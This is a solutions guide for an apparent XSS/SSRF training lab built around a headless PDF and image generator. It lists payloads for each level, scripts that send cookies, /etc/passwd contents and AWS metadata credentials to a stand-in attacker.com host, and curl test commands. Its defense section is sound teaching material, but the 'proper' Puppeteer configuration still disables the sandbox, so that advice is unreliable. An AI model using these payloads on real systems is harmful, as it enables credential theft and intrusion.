# Headless Generator XSS - Solutions Guide

This document provides solutions and exploitation techniques for the Headless PDF/Image Generator vulnerability levels. These scenarios simulate backend services that convert HTML/SVG to PDF/PNG using headless browsers (Puppeteer, Playwright, Headless Chrome).

## Overview

Headless browser vulnerabilities occur when:
- Backend services render user-supplied HTML/SVG
- JavaScript executes in a server-side browser context
- Resources are fetched from user-controlled URLs (SSRF)
- Content-Type validation can be bypassed

## Level 1: Basic HTML to PDF - No Filtering

**Endpoint:** `POST /headless-generator/level1/`

**Vulnerability:** Direct HTML reflection without any sanitization

**Solution:**
```html
<script>alert(1)</script>
```

**Alternative payloads:**
```html
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<iframe srcdoc="<script>alert(1)</script>">
```

**Real-world impact:** In production, this would execute JavaScript in the headless browser context, potentially allowing:
- Server-side request forgery (SSRF)
- Local file access via `file://` protocol
- Reading internal network resources
- Credential theft from environment variables

---

## Level 2: SVG to PNG - No Filtering

**Endpoint:** `POST /headless-generator/level2/`

**Vulnerability:** SVG rendering without script tag filtering

**Solution:**
```xml
<svg xmlns="http://www.w3.org/2000/svg">
  <script>alert(1)</script>
</svg>
```

**Alternative payloads:**
```xml
<!-- Using foreignObject to embed HTML -->
<svg xmlns="http://www.w3.org/2000/svg">
  <foreignObject width="100" height="100">
    <body xmlns="http://www.w3.org/1999/xhtml">
      <script>alert(1)</script>
    </body>
  </foreignObject>
</svg>

<!-- Using animate with JavaScript -->
<svg xmlns="http://www.w3.org/2000/svg">
  <animate attributeName="x" values="0" onbegin="alert(1)"/>
</svg>
```

**Real-world impact:** SVG files are commonly uploaded for logo/icon generation. Malicious SVG can:
- Execute JavaScript during server-side rendering
- Make HTTP requests to exfiltrate data
- Access local resources if file:// protocol is allowed

---

## Level 3: HTML Sanitization with Bypass

**Endpoint:** `POST /headless-generator/level3/`

**Vulnerability:** Only removes `<script>` tags (case-insensitive), but misses other vectors

**Solution (Event handlers):**
```html
<img src=x onerror=alert(1)>
<body onload=alert(1)>
<svg onload=alert(1)>
```

**Solution (iframe srcdoc):**
```html
<iframe srcdoc="<img src=x onerror=alert(1)>">
```

**Solution (object/embed tags):**
```html
<object data="javascript:alert(1)">
<embed src="javascript:alert(1)">
```

**Solution (form action):**
```html
<form action="javascript:alert(1)"><input type="submit"></form>
```

**Real-world lessons:**
- Blacklist-based filtering is insufficient
- Many HTML elements can execute JavaScript
- Use comprehensive HTML sanitization libraries
- Prefer allow-lists over deny-lists

---

## Level 4: SSRF via Resource Loading

**Endpoint:** `POST /headless-generator/level4/`

**Vulnerability:** Headless browser fetches external resources during rendering

**Solution (AWS metadata):**
```html
<img src="http://169.254.169.254/latest/meta-data/iam/security-credentials/">
```

**Solution (Local file access):**
```html
<img src="file:///etc/passwd">
<link rel="stylesheet" href="file:///etc/hosts">
```

**Solution (Internal network scan):**
```html
<img src="http://192.168.1.1:8080/admin">
<img src="http://10.0.0.1:6379/">
```

**Solution (DNS exfiltration):**
```html
<img src="http://stolen-data.attacker.com/">
<script src="http://exfil.attacker.com/data.js"></script>
```

**Real-world impact:**
- Access cloud metadata services (AWS, GCP, Azure)
- Scan internal networks
- Read local files if file:// is allowed
- Port scanning internal services
- Bypass IP-based authentication

**Mitigation:**
- Disable or restrict network access in headless browser
- Block private IP ranges (RFC 1918)
- Disable file:// protocol
- Use allowlists for external domains

---

## Level 5: JavaScript Callback Simulation

**Endpoint:** `POST /headless-generator/level5/`

**Vulnerability:** Detects JavaScript execution and logs callback URLs (simulates out-of-band XSS)

**Solution (fetch API):**
```html
<script>
fetch('http://attacker.com/log?data=' + document.cookie);
</script>
```

**Solution (XMLHttpRequest):**
```html
<script>
var xhr = new XMLHttpRequest();
xhr.open('GET', 'http://attacker.com/log');
xhr.send();
</script>
```

**Solution (Image beacon):**
```html
<script>
new Image().src = 'http://attacker.com/beacon?cookie=' + document.cookie;
</script>
```

**Solution (WebSocket):**
```html
<script>
var ws = new WebSocket('ws://attacker.com/');
ws.send(document.cookie);
</script>
```

**Checking your callback:**
Visit `/headless-generator/level5/callback/{your-callback-id}` to see logged requests.

**Real-world detection:**
- Out-of-band XSS detection tools (Burp Collaborator, XSS Hunter)
- Can detect "blind" XSS in admin panels, PDF generators, etc.
- JavaScript executes even without visual confirmation

---

## Level 6: Content-Type Validation Bypass

**Endpoint:** `POST /headless-generator/level6/`

**Vulnerability:** Accepts JSON but parses both JSON and raw HTML

**Solution (Valid JSON):**
```bash
curl -X POST http://localhost:3000/headless-generator/level6/ \
  -d 'content={"html":"<script>alert(1)</script>"}'
```

**Solution (Polyglot - both JSON and HTML):**
```html
<!--{"html":"--><script>alert(1)</script><!--"}-->
```

**Solution (Send HTML with JSON Content-Type header):**
```bash
curl -X POST http://localhost:3000/headless-generator/level6/ \
  -H "Content-Type: application/json" \
  -d '<script>alert(1)</script>'
```

**Solution (JSON with HTML polyglot):**
```json
{"html":"<img src=x onerror=alert(1)>"}
```

**Real-world bypass techniques:**
- Content-Type confusion attacks
- Polyglot payloads (valid in multiple formats)
- MIME sniffing exploitation
- Missing X-Content-Type-Options: nosniff

---

## Common Exploitation Patterns

### Data Exfiltration
```html
<script>
fetch('http://attacker.com/exfil', {
  method: 'POST',
  body: JSON.stringify({
    cookies: document.cookie,
    localStorage: Object.entries(localStorage),
    env: navigator.userAgent
  })
});
</script>
```

### Reading Local Files (if file:// enabled)
```html
<script>
fetch('file:///etc/passwd')
  .then(r => r.text())
  .then(data => {
    fetch('http://attacker.com/exfil?data=' + btoa(data));
  });
</script>
```

### AWS Metadata Extraction
```html
<script>
fetch('http://169.254.169.254/latest/meta-data/iam/security-credentials/')
  .then(r => r.text())
  .then(role => {
    return fetch('http://169.254.169.254/latest/meta-data/iam/security-credentials/' + role);
  })
  .then(r => r.text())
  .then(creds => {
    fetch('http://attacker.com/aws-creds', {
      method: 'POST',
      body: creds
    });
  });
</script>
```

---

## Defense Strategies

### 1. Sanitization
- Use robust HTML sanitization libraries (DOMPurify, Bleach)
- Strip all JavaScript execution vectors
- Remove dangerous tags: `<script>`, `<object>`, `<embed>`, `<iframe>`
- Remove event handlers: `onload`, `onerror`, `onclick`, etc.

### 2. Content Security Policy (CSP)
```html
Content-Security-Policy: default-src 'none'; img-src 'self'; style-src 'self'
```

### 3. Network Isolation
- Run headless browser in sandboxed environment
- Block private IP ranges (10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16)
- Disable file:// protocol access
- Use allowlists for external domains

### 4. Browser Configuration
```javascript
// Puppeteer example
const browser = await puppeteer.launch({
  args: [
    '--no-sandbox',
    '--disable-setuid-sandbox',
    '--disable-dev-shm-usage',
    '--disable-web-security',  // DON'T do this!
  ]
});

// Proper configuration
const browser = await puppeteer.launch({
  args: [
    '--no-sandbox',
    '--disable-setuid-sandbox',
  ]
});

// Block requests to private IPs
await page.setRequestInterception(true);
page.on('request', (request) => {
  const url = new URL(request.url());
  if (isPrivateIP(url.hostname) || url.protocol === 'file:') {
    request.abort();
  } else {
    request.continue();
  }
});
```

### 5. Input Validation
- Validate and sanitize all user input
- Limit file sizes
- Check Content-Type headers
- Use strict parsing (don't accept malformed input)

---

## Testing Tools

### Manual Testing
```bash
# Basic XSS test
curl -X POST http://target/pdf-generator \
  -d 'html=<script>alert(1)</script>'

# SSRF test
curl -X POST http://target/pdf-generator \
  -d 'html=<img src="http://169.254.169.254/latest/meta-data">'

# Out-of-band callback
curl -X POST http://target/pdf-generator \
  -d 'html=<script>fetch("http://burpcollaborator.net/")</script>'
```

### Automated Scanners
- **Burp Suite** - Professional web scanner with Collaborator for OOB detection
- **XSS Hunter** - Specialized XSS detection platform
- **Nuclei** - Template-based vulnerability scanner
- **Dalfox** - XSS parameter analysis and exploitation tool

---

## References

- [OWASP HTML Sanitizer](https://owasp.org/www-project-java-html-sanitizer/)
- [Content Security Policy Reference](https://content-security-policy.com/)
- [SSRF Bible](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery)
- [Puppeteer Security Best Practices](https://github.com/puppeteer/puppeteer/blob/main/docs/api.md)
- [PortSwigger Web Security Academy - XSS](https://portswigger.net/web-security/cross-site-scripting)
